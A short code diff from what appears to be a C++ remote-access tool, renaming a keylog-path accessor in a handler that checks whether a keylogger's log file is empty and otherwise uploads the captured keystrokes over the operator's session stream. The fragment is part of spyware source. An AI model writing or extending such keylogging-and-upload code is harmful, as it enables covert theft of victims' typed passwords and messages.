@@ -223,7 +223,7 @@ namespace Inhibition
 
             // si le keylog est vide, on y met un message pour dire a l'utilisateur que rien n'a
             // encore été tapé
-            if(!System::Size(Keylogger::instance().get_keylog_path()))
+            if(!System::Size(Keylogger::instance().getKeylogPath()))
             {
                 LOG << "Log file empty";
                 session() << KEYLOG_EMPTY;
@@ -231,7 +231,7 @@ namespace Inhibition
             else
             {
                 session() << SUCCESS;
-                Upload upload (Keylogger::instance().get_keylog_path(), session().stream());
+                Upload upload (Keylogger::instance().getKeylogPath(), session().stream());
                 upload.launch();
             }
         }
